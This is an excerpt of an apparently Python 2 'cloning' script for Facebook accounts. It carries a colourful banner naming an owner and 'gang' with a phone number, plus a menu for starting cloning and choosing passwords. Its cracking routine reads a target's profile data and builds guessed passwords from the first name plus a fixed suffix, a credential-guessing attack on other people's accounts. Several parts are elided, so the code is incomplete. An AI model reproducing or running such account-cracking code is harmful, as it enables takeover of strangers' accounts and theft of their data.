...
\033[1;91m╚══════╝╚═╝░░░░░                                             
\033[1;97m-----------------------------------------------
\033[1;91m➣ OWNER   : ZULFIQAR MAGSI
\033[1;91m➣ Github  : https://github.com**
\033[1;91m➣ GANG    : ZF KING GANG
\033[1;91m➣ Youtube : NOT FOUND
\033[1;91m➣ WhatsApp: +9203340002925
\033[1;97m-----------------------------------------------"""
# titik #
def tik():
	titik = [".   ","..  ","... "]
...
def menu():
	...
	print "|[✓] ID  : "+id
	print (47*"-")
	print "[1] Start Zf Cloning."
	print "[2] Choice pass ."
	print "[3] ZF Tools."
	print "[4] Auto Del Tools."
	print "[5] Update Zf Tool."
...
def men():
	...
	if rana =="":
		...
		os.system('xdg-open https://www.facebook.com/jam.sha128824')
		menu()
	elif rana =="7":
		os.system('rm -rf login.txt')
...
def crack_menu():
	...
	def main(arg):
		...
		try:
			...
			b = json.loads(a.text)
			pass1= b['first_name'] + 'freefireking'
